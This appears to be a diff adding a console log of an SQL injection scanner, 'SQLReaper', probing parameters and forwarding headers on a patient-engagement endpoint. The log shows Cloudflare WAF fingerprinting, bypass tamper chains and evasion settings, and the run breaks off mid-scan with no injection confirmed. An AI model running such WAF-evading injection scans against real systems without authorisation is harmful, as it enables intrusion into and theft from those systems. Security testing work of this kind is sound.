@@ -1,0 +1,1674 @@
+[+] [v21] Adaptive Extraction ENABLED (mutation_engine=SQLMutationEngine)
+[+] [v21]   Max bypasses: 10
+[+] [v21]   WAF threshold: 30%
+[+] [v21]   Max recovery attempts: 15
+
+============================================================
+[SQLReaper v25] Scan starting 13:29:10 url='/patient_engagement/placem
+============================================================
+[+] [*] SQLReaper v26.0 starting — 6 DBMSes × 10 techniques × 300 payloads
+[+] [Estimate] 5 params  6 DBMS  ~21 techniques
+[+] [Estimate] ~819 probes at ~1.2 req/s
+[+] [Estimate] Estimated time: ~10 minutes
+[*] Estimated scan time: 10m 55s (5 params × 6 DBMSes × 21 techniques, level=1)
+[+] [Session] Resuming from saved state: 0 params completed
+[!] StealthEngine: blocking detected, delay  1.2s
+[!] StealthEngine: blocking detected, delay  3.1s
+[!] StealthEngine: blocking detected, delay  7.8s
+[!] StealthEngine: blocking detected, delay  12.0s
+[!] StealthEngine: blocking detected, delay  12.0s
+[+] ML WAF fingerprint: Cloudflare (conf=0.94)
+[+] ML WAF: Cloudflare
+[+] [v19] WAFMLBypassGenerator activated (WAF=Cloudflare, waf_bypass=5)
+[!] StealthEngine: blocking detected, delay  12.0s
+[!] StealthEngine: blocking detected, delay  12.0s
+[!] StealthEngine: blocking detected, delay  12.0s
+[!] StealthEngine: blocking detected, delay  12.0s
+[!] StealthEngine: 5 consecutive max-delay blocks — WAF not responding to delay strategy. Permanently disabling backoff, delay fixed at 0.5s (BUG-V198-STEALTH-SAWTOOTH FIX)
+[+] Safe-mode verification:
+ Ready to scan [oracle=differential]
+   WAF challenge page detected on clean request
+   Neither error nor boolean signal detected on clean probes  may be blind-only
+   403/WAF  DIFFERENTIAL oracle active
+   Use --playwright to handle JS challenge, or resolve manually
+   Differential oracle active (emd=0.0130 len_=268 status_diff=False)  scanning in DIFFERENTIAL mode
+[+] [OracleMode] Selected: differential
+[+] Pre-scan verification OK
+[!] Jitter profile: HIGH_JITTER cv=0.81  timing unreliable, prefer boolean
+[!] Jitter profile recommends SLEEP(3.0s) (target natural variance too high for 2.0s)
+[+] Auto-adjusted --time-sec to 3.0s
+[!] Timing unreliable  deprioritising time-based detection
+[+] [v19] Oracle mode confirmed: differential
+[*] [diag-cascade] _v14_cascade entered: url='/patient_engagement/placements?countr'
+[+] KB tamper chain: ['concat2concatws', 'ifnull2ifisnull', 'modsecurityzeroversioned', 'uppercase', 'paramfragment']
+[*] [diag-cascade] discovered params: ['country', 'variant', 'channel', 'target', 'limit', 'ssid', 'rum', 'expire'] markers=[]
+[*] Conformal calibration block complete, proceeding to causal discovery...
+[+] [Estimate] 3 params  6 DBMS  ~10 techniques
+[+] [Estimate] ~234 probes at ~1.2 req/s
+[+] [Estimate] Estimated time: ~3 minutes
+
+[*] ══════════════════════════════════════════════════════
+[*]  SCAN PLAN: 1 DBMS × 10 categories × 8 params × 3 methods
+[*]  DBMSes   : ['PostgreSQL']
+[*]  Params   : ['country', 'variant', 'channel', 'target', 'limit', 'ssid', 'rum', 'expire']
+[*]  Categories: ['Boolean', 'Timebased', 'Error', 'Union', 'Stacked', 'Standard', 'Novel', 'WAFBypass', 'Exotic', 'Hybrid']
+[*]  Payloads  : 300 per DBMS×category at level 1 = 3000 total
+[*] ══════════════════════════════════════════════════════
+
+[+]  Endpoint [1/1]: POST /patient_engagement/placements (8 params, source=direct)
+[*] A/B detection profiling for 'country'...
+[*] Stability profiling for 'country'...
+[!] [TimingCal] CDN-cached baseline (P95=0.0ms < 5ms) — baseline probes served from edge cache.  Injection payloads bypass CDN cache and hit backend directly.  Jitter profiler will refine sleep estimate against real backend latency.
+[+] [TimingCal] Baseline: median=0ms P95=0ms IQR=0ms  optimal SLEEP=1.0s
+[Gate]  All 12 optimizations enabled
+[*] [RateCalibrate] Probing rate limits on /patient_engagement/placements?countr...
+[*] [RateCalibrate] User specified --rpm 60, respecting user setting
+[*] [RateCalibrate] Completed
+[*] [RDF] Profiling server response to suspicious headers (6 probes)...
+[+] [RDF] Result: SQL_SPECIFIC
+[+] [RDF] Headers: server reacts specifically to SQL
+[+] Launching expanded surfaces in parallel (WAF: Cloudflare)
+[*] [diag-task] creating primary task: param='country' orig='fr'
+[*] [HDR] Preparing 138 headers for batched scanning ( GET/POST/PUT  all techniques  all DBMS)...
+[*] [COOKIE] Probing for injectable cookies...
+[*] [PUT] Full cascade scan starting (all techniques  all DBMS)...
+[*] [diag-surface] scan_surface called: surface='PUT:/patient_engagement/placements' params=['country']
+[+] Scanning surface: 'PUT:/patient_engagement/placements' (1 parameters)
+[*] [diag-probe] _probe_one_param entry: param='country' already_confirmed=False
+[*] --- testing 'country' @ /patient_engagement/placements?country=fr&varia
+[*]   evasion: chunked, HPP, random-UA, multipart
+[*] Building baseline for 'country'...
+[*] Baseline ready (status=200)
+[*] Starting technique cascade (ALL)...
+[*] Using calibrated gap=0.250
+[*] [diag] entering try_all: param='country' gate_killed=False gate_circuit=False oracle=OracleMode.DIFFERENTIAL techniques=ALL
+[*] Cascade engine: testing 'country'...
+[*] [PATCH] Full cascade scan starting (all techniques  all DBMS)...
+[*] [diag-surface] scan_surface called: surface='PATCH:/patient_engagement/placements' params=['country']
+[+] Scanning surface: 'PATCH:/patient_engagement/placements' (1 parameters)
+[*] [diag-probe] _probe_one_param entry: param='country' already_confirmed=False
+[*] --- testing 'country' @ /patient_engagement/placements?country=fr&varia
+[*]   evasion: chunked, HPP, random-UA, multipart
+[*] Building baseline for 'country'...
+[*] Baseline ready (status=200)
+[*] Starting technique cascade (ALL)...
+[*] Using calibrated gap=0.250
+[*] [diag] entering try_all: param='country' gate_killed=False gate_circuit=False oracle=OracleMode.DIFFERENTIAL techniques=ALL
+[*] Cascade engine: testing 'country'...
+[*] [diag-surface] scan_surface called: surface='POST:/patient_engagement/placements' params=['country']
+[+] Scanning surface: 'POST:/patient_engagement/placements' (1 parameters)
+[*] [diag-probe] _probe_one_param entry: param='country' already_confirmed=False
+[*] --- testing 'country' @ /patient_engagement/placements?country=fr&varia
+[*]   evasion: chunked, HPP, random-UA, multipart
+[*] Building baseline for 'country'...
+[*] Baseline ready (status=200)
+[*] Starting technique cascade (ALL)...
+[*] Using calibrated gap=0.250
+[*] [diag] entering try_all: param='country' gate_killed=False gate_circuit=False oracle=OracleMode.DIFFERENTIAL techniques=ALL
+[*] Cascade engine: testing 'country'...
+[*] [COOKIE] No Set-Cookie headers in response  skipping cookie injection
+[*] [HDR] Scanning 138 headers in batches of 2...
+[*] [diag-surface] scan_surface called: surface='HDR:X-Forwarded-For:POST' params=['X-Forwarded-For']
+[+] Scanning surface: 'HDR:X-Forwarded-For:POST' (1 parameters)
+[*] [diag-probe] _probe_one_param entry: param='X-Forwarded-For' already_confirmed=False
+[*] --- testing 'X-Forwarded-For' @ /patient_engagement/placements?country=fr&varia
+[*]   evasion: chunked, HPP, random-UA, multipart
+[*] Building baseline for 'X-Forwarded-For'...
+[*] Baseline ready (status=200)
+[*] Starting technique cascade (ALL)...
+[*] Using calibrated gap=0.250
+[*] [diag] entering try_all: param='X-Forwarded-For' gate_killed=False gate_circuit=False oracle=OracleMode.DIFFERENTIAL techniques=ALL
+[*] Cascade engine: testing 'X-Forwarded-For'...
+[*] [diag-surface] scan_surface called: surface='HDR:X-Real-IP:POST' params=['X-Real-IP']
+[+] Scanning surface: 'HDR:X-Real-IP:POST' (1 parameters)
+[*] [diag-probe] _probe_one_param entry: param='X-Real-IP' already_confirmed=False
+[*] --- testing 'X-Real-IP' @ /patient_engagement/placements?country=fr&varia
+[*]   evasion: chunked, HPP, random-UA, multipart
+[*] Building baseline for 'X-Real-IP'...
+[*] Baseline ready (status=200)
+[*] Starting technique cascade (ALL)...
+[*] Using calibrated gap=0.250
+[*] [diag] entering try_all: param='X-Real-IP' gate_killed=False gate_circuit=False oracle=OracleMode.DIFFERENTIAL techniques=ALL
+[*] Cascade engine: testing 'X-Real-IP'...
+
+[*] ╔══════════════════════════════════════════════════════╗
+[*] ║  DBMS [1/1]: PostgreSQL   | 10 categories x 300 payloads ║
+[*] ╚══════════════════════════════════════════════════════╝
+[*] [diag] PostgreSQL base_tech_map non-empty: {'B': 2876, 'BH': 2876, 'IN': 2876, 'BT': 2876, 'T': 2876, 'TH': 2876, 'HQ': 2876, 'E': 2876, 'EH': 2876, 'U': 2876, 'UE': 2876, 'UH': 2876, 'S': 2876, 'ST': 2876, 'NV': 2876, 'WB': 2876, 'EX': 2876, 'HY': 2876, 'SO': 2876}
+    [B] PostgreSQL: 2876 payloads
+    [BH] PostgreSQL: 2876 payloads
+    [IN] PostgreSQL: 2876 payloads
+    [BT] PostgreSQL: 2876 payloads
+    [T] PostgreSQL: 2876 payloads
+    [TH] PostgreSQL: 2876 payloads
+    [HQ] PostgreSQL: 2876 payloads
+    [E] PostgreSQL: 2876 payloads
+    [EH] PostgreSQL: 2876 payloads
+    [U] PostgreSQL: 2876 payloads
+    [UE] PostgreSQL: 2876 payloads
+    [UH] PostgreSQL: 2876 payloads
+    [S] PostgreSQL: 2876 payloads
+    [ST] PostgreSQL: 2876 payloads
+    [NV] PostgreSQL: 2876 payloads
+    [WB] PostgreSQL: 2876 payloads
+    [EX] PostgreSQL: 2876 payloads
+    [HY] PostgreSQL: 2876 payloads
+    [SO] PostgreSQL: 2876 payloads
+[*] [diag] PostgreSQL base_tech_map non-empty: {'B': 2876, 'BH': 2876, 'IN': 2876, 'BT': 2876, 'T': 2876, 'TH': 2876, 'HQ': 2876, 'E': 2876, 'EH': 2876, 'U': 2876, 'UE': 2876, 'UH': 2876, 'S': 2876, 'ST': 2876, 'NV': 2876, 'WB': 2876, 'EX': 2876, 'HY': 2876, 'SO': 2876}
+    [B] PostgreSQL: 2876 payloads
+    [BH] PostgreSQL: 2876 payloads
+    [IN] PostgreSQL: 2876 payloads
+    [BT] PostgreSQL: 2876 payloads
+    [T] PostgreSQL: 2876 payloads
+    [TH] PostgreSQL: 2876 payloads
+    [HQ] PostgreSQL: 2876 payloads
+    [E] PostgreSQL: 2876 payloads
+    [EH] PostgreSQL: 2876 payloads
+    [U] PostgreSQL: 2876 payloads
+    [UE] PostgreSQL: 2876 payloads
+    [UH] PostgreSQL: 2876 payloads
+    [S] PostgreSQL: 2876 payloads
+    [ST] PostgreSQL: 2876 payloads
+    [NV] PostgreSQL: 2876 payloads
+    [WB] PostgreSQL: 2876 payloads
+    [EX] PostgreSQL: 2876 payloads
+    [HY] PostgreSQL: 2876 payloads
+    [SO] PostgreSQL: 2876 payloads
+[*] [diag] PostgreSQL base_tech_map non-empty: {'B': 2876, 'BH': 2876, 'IN': 2876, 'BT': 2876, 'T': 2876, 'TH': 2876, 'HQ': 2876, 'E': 2876, 'EH': 2876, 'U': 2876, 'UE': 2876, 'UH': 2876, 'S': 2876, 'ST': 2876, 'NV': 2876, 'WB': 2876, 'EX': 2876, 'HY': 2876, 'SO': 2876}
+    [B] PostgreSQL: 2876 payloads
+    [BH] PostgreSQL: 2876 payloads
+    [IN] PostgreSQL: 2876 payloads
+    [BT] PostgreSQL: 2876 payloads
+    [T] PostgreSQL: 2876 payloads
+    [TH] PostgreSQL: 2876 payloads
+    [HQ] PostgreSQL: 2876 payloads
+    [E] PostgreSQL: 2876 payloads
+    [EH] PostgreSQL: 2876 payloads
+    [U] PostgreSQL: 2876 payloads
+    [UE] PostgreSQL: 2876 payloads
+    [UH] PostgreSQL: 2876 payloads
+    [S] PostgreSQL: 2876 payloads
+    [ST] PostgreSQL: 2876 payloads
+    [NV] PostgreSQL: 2876 payloads
+    [WB] PostgreSQL: 2876 payloads
+    [EX] PostgreSQL: 2876 payloads
+    [HY] PostgreSQL: 2876 payloads
+    [SO] PostgreSQL: 2876 payloads
+[*] │   Testing 19 technique codes in order: ['B', 'BH', 'IN', 'BT', 'T', 'TH', 'HQ', 'E', 'EH', 'U', 'UE', 'UH', 'S', 'ST', 'NV', 'WB', 'EX', 'HY', 'SO']
+[*] ├─ [1/10] PostgreSQL › Boolean    │ tech=B    │ 572 base payloads (2876 expanded)
+[*] │   Testing 19 technique codes in order: ['B', 'BH', 'IN', 'BT', 'T', 'TH', 'HQ', 'E', 'EH', 'U', 'UE', 'UH', 'S', 'ST', 'NV', 'WB', 'EX', 'HY', 'SO']
+[*] ├─ [1/10] PostgreSQL › Boolean    │ tech=B    │ 572 base payloads (2876 expanded)
+[*] │   Testing 19 technique codes in order: ['B', 'BH', 'IN', 'BT', 'T', 'TH', 'HQ', 'E', 'EH', 'U', 'UE', 'UH', 'S', 'ST', 'NV', 'WB', 'EX', 'HY', 'SO']
+[*] ├─ [1/10] PostgreSQL › Boolean    │ tech=B    │ 572 base payloads (2876 expanded)
+[*] [diag] PostgreSQL base_tech_map non-empty: {'B': 2876, 'BH': 2876, 'IN': 2876, 'BT': 2876, 'T': 2876, 'TH': 2876, 'HQ': 2876, 'E': 2876, 'EH': 2876, 'U': 2876, 'UE': 2876, 'UH': 2876, 'S': 2876, 'ST': 2876, 'NV': 2876, 'WB': 2876, 'EX': 2876, 'HY': 2876, 'SO': 2876}
+[*] [diag] PostgreSQL base_tech_map non-empty: {'B': 2876, 'BH': 2876, 'IN': 2876, 'BT': 2876, 'T': 2876, 'TH': 2876, 'HQ': 2876, 'E': 2876, 'EH': 2876, 'U': 2876, 'UE': 2876, 'UH': 2876, 'S': 2876, 'ST': 2876, 'NV': 2876, 'WB': 2876, 'EX': 2876, 'HY': 2876, 'SO': 2876}
+[*] │   Testing 19 technique codes in order: ['B', 'BH', 'IN', 'BT', 'T', 'TH', 'HQ', 'E', 'EH', 'U', 'UE', 'UH', 'S', 'ST', 'NV', 'WB', 'EX', 'HY', 'SO']
+[*] ├─ [1/10] PostgreSQL › Boolean    │ tech=B    │ 572 base payloads (2876 expanded)
+[*] │   Testing 19 technique codes in order: ['B', 'BH', 'IN', 'BT', 'T', 'TH', 'HQ', 'E', 'EH', 'U', 'UE', 'UH', 'S', 'ST', 'NV', 'WB', 'EX', 'HY', 'SO']
+[*] ├─ [1/10] PostgreSQL › Boolean    │ tech=B    │ 572 base payloads (2876 expanded)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#1)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#2)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Forwarded-For' req#3)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Real-IP' req#4)
+    [B-bool] [PostgreSQL] 'country' req#1 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#5)
+    [B-bool] [PostgreSQL] 'country' req#1 sim=0.438 combined=0.663 thresh=0.800  DIFF
+    [B-bool] [PostgreSQL] 'X-Real-IP' req#1 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#2)
+[+]   [Wasserstein] dist=0.0195 below threshold 0.25  not confirmed
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#6)
+[*]    Wasserstein comparison probe (param='country' req#2)
+[+]   [Wasserstein] dist=0.0195 below threshold 0.25  not confirmed
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#7)
+[*]    Wasserstein comparison probe (param='X-Real-IP' req#2)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Real-IP' req#8)
+    [B-bool] [PostgreSQL] 'country' req#1 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#9)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#10)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Real-IP' req#11)
+[*]    Wasserstein comparison probe (param='country' req#2)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#12)
+    [B-bool] [PostgreSQL] 'X-Forwarded-For' req#1 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#2)
+[+]   [Wasserstein] dist=0.0195 below threshold 0.25  not confirmed
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Forwarded-For' req#13)
+    [B-bool] [PostgreSQL] 'country' req#4 sim=0.500 combined=0.700 thresh=0.800  DIFF
+    [B-bool] [PostgreSQL] 'X-Real-IP' req#4 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#14)
+[*]    Wasserstein comparison probe (param='country' req#5)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#15)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Forwarded-For' req#16)
+[*]    Wasserstein comparison probe (param='X-Real-IP' req#5)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Real-IP' req#17)
+    [B-bool] [PostgreSQL] 'country' req#4 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#5)
+[+]   [Wasserstein] dist=0.0195 below threshold 0.25  not confirmed
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#18)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#19)
+    [B-bool] [PostgreSQL] 'country' req#4 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Real-IP' req#20)
+[*]    Wasserstein comparison probe (param='country' req#5)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#21)
+    [B-bool] [PostgreSQL] 'X-Forwarded-For' req#4 sim=0.500 combined=0.700 thresh=0.800  DIFF
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#22)
+    [B-bool] [PostgreSQL] 'country' req#7 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#23)
+    [B-bool] [PostgreSQL] 'X-Real-IP' req#7 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#5)
+[+]   [Wasserstein] dist=0.0195 below threshold 0.25  not confirmed
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Forwarded-For' req#24)
+[*]    Wasserstein comparison probe (param='country' req#8)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0195 < 0.02 over 3 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#25)
+[*]    Wasserstein comparison probe (param='X-Real-IP' req#8)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0000 < 0.02 over 3 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Real-IP' req#26)
+    [B-bool] [PostgreSQL] 'country' req#7 sim=0.500 combined=0.700 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#8)
+[*]   [Wasserstein] dist=0.0195 CONSISTENT (range=0.0000 < 0.02 over 3 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#27)
+    [B-bool] [PostgreSQL] 'country' req#7 sim=0.500 combined=0.700 thresh=0.800  DIFF
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Forwarded-For' req#28)
+[*]    Wasserstein comparison probe (param='country' req#8)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0000 < 0.02 over 3 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#29)
+    [B-bool] [PostgreSQL] 'country' req#9 sim=0.438 combined=0.663 thresh=0.800  DIFF
+    [B-bool] [PostgreSQL] 'X-Real-IP' req#9 sim=0.438 combined=0.663 thresh=0.800  DIFF
+    [B-bool] [PostgreSQL] 'X-Forwarded-For' req#7 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#8)
+[*]   [Wasserstein] dist=0.0195 CONSISTENT (range=0.0000 < 0.02 over 3 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Forwarded-For' req#30)
+[*]    Wasserstein comparison probe (param='country' req#10)
+[*]   [Wasserstein] dist=0.0195 CONSISTENT (range=0.0195 < 0.02 over 4 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#31)
+[*]    Wasserstein comparison probe (param='X-Real-IP' req#10)
+[*]   [Wasserstein] dist=0.0195 CONSISTENT (range=0.0195 < 0.02 over 4 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Real-IP' req#32)
+    [B-bool] [PostgreSQL] 'country' req#9 sim=0.438 combined=0.663 thresh=0.800  DIFF
+    [B-bool] [PostgreSQL] 'country' req#9 sim=0.500 combined=0.700 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#10)
+[*]   [Wasserstein] dist=0.0195 CONSISTENT (range=0.0195 < 0.02 over 4 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#33)
+[*]    Wasserstein comparison probe (param='country' req#10)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0195 < 0.02 over 4 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#34)
+    [B-bool] [PostgreSQL] 'X-Forwarded-For' req#9 sim=0.500 combined=0.700 thresh=0.800  DIFF
+    [B-bool] [PostgreSQL] 'X-Real-IP' req#11 sim=0.500 combined=0.700 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#10)
+[*]   [Wasserstein] dist=0.0195 CONSISTENT (range=0.0000 < 0.02 over 4 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Forwarded-For' req#35)
+[*]    Wasserstein comparison probe (param='X-Real-IP' req#12)
+[*]   [Wasserstein] dist=0.0195 CONSISTENT (range=0.0195 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Real-IP' req#36)
+    [B-bool] [PostgreSQL] 'country' req#11 sim=0.438 combined=0.663 thresh=0.800  DIFF
+    [B-bool] [PostgreSQL] 'country' req#11 sim=0.500 combined=0.700 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#12)
+[*]   [Wasserstein] dist=0.0195 CONSISTENT (range=0.0195 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#37)
+    [B-bool] [PostgreSQL] 'country' req#11 sim=0.500 combined=0.700 thresh=0.800  DIFF
+    [B-bool] [PostgreSQL] 'X-Real-IP' req#13 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#12)
+[*]   [Wasserstein] dist=0.0195 CONSISTENT (range=0.0195 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#38)
+    [B-bool] [PostgreSQL] 'X-Forwarded-For' req#11 sim=0.500 combined=0.700 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='X-Real-IP' req#14)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0195 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Real-IP' req#39)
+    [B-bool] [PostgreSQL] 'country' req#13 sim=0.500 combined=0.700 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#12)
+[*]   [Wasserstein] dist=0.0195 CONSISTENT (range=0.0195 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#40)
+[*]    Wasserstein comparison probe (param='country' req#14)
+[*]   [Wasserstein] dist=0.0195 CONSISTENT (range=0.0195 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#41)
+    [B-bool] [PostgreSQL] 'country' req#13 sim=0.438 combined=0.663 thresh=0.800  DIFF
+    [B-bool] [PostgreSQL] 'X-Real-IP' req#15 sim=0.500 combined=0.700 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='X-Real-IP' req#16)
+[+]   [Wasserstein] secondary oracle confirmed (dist=0.6795, threshold=0.25)  accepting boolean detection
+[*] Running PCV on B→B detection (PostgreSQL)...
+[*] [diag] _try_technique: tech=B dbms=PostgreSQL templates=2876 → testing 575 payloads
+[*] [diag] _try_technique: tech=B dbms=PostgreSQL templates=2876 → testing 575 payloads
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#12)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0195 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] [diag] _try_technique: tech=B dbms=PostgreSQL templates=2876 → testing 575 payloads
+[*]   [PCV] Using exact detection payload (bypass mutation for 100% reproduction)
+[*]   [PCV] Post-confirmation verification (3 checks with fallbacks)...
+    [CTX-bool] order_by: sim_t=1.000 sim_f=0.500 gap=0.500 need=0.250  CONFIRMED (1/6)
+[+] [CTX-bool] order_by: strong gap=0.500 (≥ 0.500 = 2× threshold) — skipping multi-probe (2× Wasserstein-confirmed gap is self-sufficient; multi-probe fails from page noise not FP)
+    [CTX-bool] multi-probe skipped — strong gap=0.500 (≥ 0.500 = 2× threshold, Wasserstein already confirmed)
+[*] Running PCV on B→B detection (PostgreSQL)...
+    [CTX-bool] order_by: sim_t=0.500 sim_f=1.000 gap=-0.500 need=0.250  CONFIRMED (1/6)  [reversed-polarity]
+    [CTX-bool] multi-probe FAILED (1/3)
+    [CTX-bool] order_by: sim_t=1.000 sim_f=0.500 gap=0.500 need=0.250  CONFIRMED (1/6)
+[+] [CTX-bool] order_by: strong gap=0.500 (≥ 0.500 = 2× threshold) — skipping multi-probe (2× Wasserstein-confirmed gap is self-sufficient; multi-probe fails from page noise not FP)
+    [CTX-bool] multi-probe skipped — strong gap=0.500 (≥ 0.500 = 2× threshold, Wasserstein already confirmed)
+[*] Running PCV on B→B detection (PostgreSQL)...
+    [CTX-bool] limit_offset: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+[*]    Wasserstein comparison probe (param='country' req#14)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0195 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] [diag] _try_technique: tech=B dbms=PostgreSQL templates=2876 → testing 575 payloads
+    [CTX-bool] order_by: sim_t=1.000 sim_f=0.500 gap=0.500 need=0.250  CONFIRMED (1/6)
+[+] [CTX-bool] order_by: strong gap=0.500 (≥ 0.500 = 2× threshold) — skipping multi-probe (2× Wasserstein-confirmed gap is self-sufficient; multi-probe fails from page noise not FP)
+    [CTX-bool] multi-probe skipped — strong gap=0.500 (≥ 0.500 = 2× threshold, Wasserstein already confirmed)
+[*] Running PCV on B→B detection (PostgreSQL)...
+    [CTX-bool] where_equals: sim_t=1.000 sim_f=0.500 gap=0.500 need=0.250  CONFIRMED (1/6)
+[+] [CTX-bool] where_equals: strong gap=0.500 (≥ 0.500 = 2× threshold) — skipping multi-probe (2× Wasserstein-confirmed gap is self-sufficient; multi-probe fails from page noise not FP)
+    [CTX-bool] multi-probe skipped — strong gap=0.500 (≥ 0.500 = 2× threshold, Wasserstein already confirmed)
+[*] Running PCV on B→B detection (PostgreSQL)...
+[*]     Check A (body canary): PASS  via LENGTH-num+tautology-num gap=0.500
+[*]     Check C (error fingerprint): FAIL (3 fallbacks tried, baseline-subtracted)
+[*]     Check D (header diff): FAIL (1 diffs)
+[*]     Check E (PostgreSQL SQL): skipped (boolean technique (Check A already covers this mechanism))
+[*]   [PCV] Using exact detection payload (bypass mutation for 100% reproduction)
+[*]   [PCV] Post-confirmation verification (3 checks with fallbacks)...
+[!] PCV FP-Guards PRIMARY REJECTED [B→B] PostgreSQL (L1-L6+Welch+FPV) — dynamic page or statistical noise, NOT confirming injection
+[!] PCV FAILED for [B] PostgreSQL  continuing with next payload...
+[!] PCV FAILED for bypass [B] PostgreSQL  trying plain payloads...
+[*] [diag] _try_technique: tech=B dbms=PostgreSQL templates=2876 → testing 575 payloads
+[*]     Check A (body canary): PASS  via SUBSTRING (derived)+SUBSTRING gap=0.500
+[*]     Check C (error fingerprint): FAIL (3 fallbacks tried, baseline-subtracted)
+[*]     Check D (header diff): FAIL (1 diffs)
+[*]     Check E (PostgreSQL SQL): skipped (boolean technique (Check A already covers this mechanism))
+[*]     Check B (timing canary): SKIPPED — skipped(non-timing tech=B, no SLEEP/WAITFOR in payload)
+[*]   [PCV] Result: REJECTED  error page (400, 0B) requires timing proof or strong body evidence, all checks failed
+[*]   [PCV] Using exact detection payload (bypass mutation for 100% reproduction)
+[*]   [PCV] Post-confirmation verification (3 checks with fallbacks)...
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Real-IP' req#42)
+[!] PCV FP-Guards PRIMARY REJECTED [B→B] PostgreSQL (L1-L6+Welch+FPV) — dynamic page or statistical noise, NOT confirming injection
+[!] PCV FAILED for [B] PostgreSQL  continuing with next payload...
+[*] [PATCH] Cascade complete  no injections found
+    [B-bool] [PostgreSQL] 'X-Real-IP' req#17 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='X-Real-IP' req#18)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Real-IP' req#43)
+    [B-bool] [PostgreSQL] 'X-Real-IP' req#19 sim=0.500 combined=0.700 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='X-Real-IP' req#20)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Real-IP' req#44)
+    [B-bool] [PostgreSQL] 'X-Real-IP' req#21 sim=0.500 combined=0.700 thresh=0.800  DIFF
